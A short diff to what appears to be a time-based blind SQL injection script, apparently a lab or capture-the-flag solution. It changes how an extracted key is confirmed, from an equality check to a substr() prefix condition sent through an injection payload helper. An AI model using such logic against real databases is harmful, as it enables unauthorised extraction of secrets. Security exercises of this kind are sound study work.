@@ -10,8 +10,8 @@ def verify_key():
     with open('key.txt', 'r') as file:
         key = file.read().rstrip()
 
-    # check the validity of the whole key
-    prefix_payload = build_sql_payload(f"key=='{key}'")
+    # check the validity of the key
+    prefix_payload = build_sql_payload(f"substr(key,1,{len(key)})='{key}'")
     if (check_payload_true(KNOWN_USER, prefix_payload, THRESHOLD_SECONDS)):
         logger.info("✅ Key is correct")
     else:
